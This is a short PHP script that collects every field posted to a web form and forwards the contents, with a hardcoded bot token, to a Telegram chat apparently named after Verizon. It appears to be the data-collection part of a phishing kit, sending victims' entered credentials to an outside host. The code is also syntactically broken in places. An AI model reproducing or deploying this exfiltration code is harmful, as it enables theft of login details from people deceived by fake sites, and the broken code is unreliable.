<?php

$content = '';

foreach ($_POST as $key => $value) {

if($value){

$content .= "<b>$key</b>: <i>$value</i>\n";

}

if(trim($content))(

$content ="<b>Message from Site:</b>\n".$content;

$apiToken = "7214241777:AAG3Jl8zIAqKfqs6Z0Z0JElxT3mbrLBqh_4";

$data = [

'chat_id' => '@Bobzysverizonbot',

'text' => $content,

'parse_mode' =>'HTML' 

];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data))
}
?>